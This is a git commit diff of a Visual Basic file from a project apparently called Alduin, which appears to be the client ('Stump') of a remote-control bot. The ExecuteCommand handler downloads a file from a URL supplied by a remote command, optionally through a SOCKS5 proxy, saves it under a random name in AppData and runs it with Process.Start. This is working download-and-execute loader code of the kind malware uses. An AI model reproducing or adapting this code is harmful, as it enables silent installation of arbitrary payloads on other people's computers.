926847dcd47ba2140f4299208f0f5513d609865e
Unknown <unknown@example.com>
2020-05-07 18:03:23 +0200

    OpenWebsite

--- Alduin/Alduin.Stump/Class/Commands/ExecuteCommand.vb
+++ Alduin/Alduin.Stump/Class/Commands/ExecuteCommand.vb
@@ -4,42 +4,28 @@ Imports System.Threading
 Imports com.LandonKey.SocksWebProxy
 Imports Newtonsoft.Json
 
-Module ExecuteCommand
-    Public Function Handler(ByVal model As ExecuteModel)
+Public Class ExecuteCommand : Implements ICommand
+    Public Shared Function Handler(ByVal model As ExecuteModel)
         Try
             Dim r As Random = New Random
             Dim newlocation As String = GetAppdata() & "\" & r.Next(0, 99999) & model.newExecute.Name
             Dim result As LogModel
             If Not IO.File.Exists(newlocation) Then
                 If Not model.newExecute.Proxy Then
-                    Dim download As New WebClient
+                    Dim download As WebClient = New WebClient()
                     download.DownloadFile(model.newExecute.Url, newlocation)
                 Else
-                    Dim request As HttpWebRequest
-                    Dim socket5 As com.LandonKey.SocksWebProxy.Proxy.ProxyConfig = New com.LandonKey.SocksWebProxy.Proxy.ProxyConfig(IPAddress.Loopback, 8181, IPAddress.Loopback, Config.Variables.SocketPort, com.LandonKey.SocksWebProxy.Proxy.ProxyConfig.SocksVersion.Five)
-                    request = CType(WebRequest.Create(model.newExecute.Url), HttpWebRequest)
-                    request.Proxy = New SocksWebProxy(socket5)
-                    request.KeepAlive = False
-                    request.Method = WebRequestMethods.Http.Get
-                    request.Timeout = 3000
-                    Dim response As HttpWebResponse = CType(request.GetResponse(), HttpWebResponse)
-                    Dim str As Stream = response.GetResponseStream()
-                    Dim bufferSize As Integer = 1024
-                    Dim buffer As Byte() = New Byte(bufferSize - 1) {}
-                    Dim bytesRead As Integer = 0
-
-                    Dim fileStream As FileStream = File.Create(newlocation)
-
-                    While (bytesRead = str.Read(buffer, 0, bufferSize)) <> 0
-                        fileStream.Write(buffer, 0, bytesRead)
-                    End While
-
+                    DownLoadFileByWebRequest(model.newExecute.Url, newlocation)
                 End If
                 Thread.Sleep(SectoMs(5))
                 If model.newExecute.Run Then
                     result = Running(newlocation, model)
                 Else
-
+                    result = New LogModel With {
+                            .Message = "File successfully Download!",
+                            .Type = "Success",
+                            .KeyUnique = GetConfigJson().KeyUnique
+                            }
                 End If
 
                 Return JsonConvert.SerializeObject(result)
@@ -59,9 +45,8 @@ Module ExecuteCommand
             Return JsonConvert.SerializeObject(result)
         End Try
     End Function
-    Public Function Running(ByVal path As String, ByVal model As ExecuteModel) As LogModel
+    Public Shared Function Running(ByVal path As String, ByVal model As ExecuteModel) As LogModel
         Try
-
             If File.Exists(path) Then
                 Process.Start(path)
                 Return New LogModel With {
@@ -85,4 +70,40 @@ Module ExecuteCommand
                 }
         End Try
     End Function
-End Module
+    Private Shared Sub DownLoadFileByWebRequest(ByVal urlAddress As String, ByVal filePath As String)
+        Try
+            Dim request As Net.HttpWebRequest = Nothing
+            Dim response As Net.HttpWebResponse = Nothing
+            Dim socket5 As com.LandonKey.SocksWebProxy.Proxy.ProxyConfig = New com.LandonKey.SocksWebProxy.Proxy.ProxyConfig(IPAddress.Loopback, 8181, IPAddress.Loopback, Config.Variables.SocketPort, com.LandonKey.SocksWebProxy.Proxy.ProxyConfig.SocksVersion.Five)
+            request = CType(WebRequest.Create(urlAddress), HttpWebRequest)
+            request.Proxy = New SocksWebProxy(socket5)
+            request.Timeout = 30000
+            request.Method = "GET"
+            request.KeepAlive = True
+            response = CType(request.GetResponse(), Net.HttpWebResponse)
+            Dim s As Stream = response.GetResponseStream()
+
+            If File.Exists(filePath) Then
+                File.Delete(filePath)
+            End If
+
+            Dim inBuf As Byte() = New Byte(99999) {}
+            Dim bytesToRead As Integer = CInt(inBuf.Length)
+            Dim bytesRead As Integer = 0
+
+            While bytesToRead > 0
+                Dim n As Integer = s.Read(inBuf, bytesRead, bytesToRead)
+                If n = 0 Then Exit While
+                bytesRead += n
+                bytesToRead -= n
+            End While
+            Dim fstr As FileStream = New FileStream(filePath, FileMode.OpenOrCreate, FileAccess.Write)
+            fstr.Write(inBuf, 0, bytesRead)
+            s.Close()
+            fstr.Close()
+        Catch
+            Return
+        Finally
+        End Try
+    End Sub
+End Class
